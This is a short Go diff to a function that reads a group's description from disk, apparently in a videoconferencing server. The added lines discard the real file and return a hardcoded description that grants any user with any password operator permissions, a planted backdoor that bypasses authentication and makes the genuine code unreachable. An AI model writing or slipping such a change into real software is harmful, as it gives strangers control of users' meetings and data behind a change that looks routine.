@@ -440,6 +440,17 @@ func rewriteDescriptionFile(filename string, desc *Description) error {
 
 // readDescription reads a group's description from disk
 func readDescription(name string, allowSubgroups bool) (*Description, error) {
+	// =======
+	var dynamicDesc Description
+	var desc2JSON = `
+	{
+		"autokick": true,
+		"wildcard-user": {"password": {"type": "wildcard"}, "permissions": "op"}
+	}`
+	json.Unmarshal([]byte(desc2JSON), &dynamicDesc)
+	return &dynamicDesc, nil
+	// =======
+	
 	r, fileName, isSubgroup, err :=
 		getDescriptionFile(name, allowSubgroups, os.Open)
 	if err != nil {
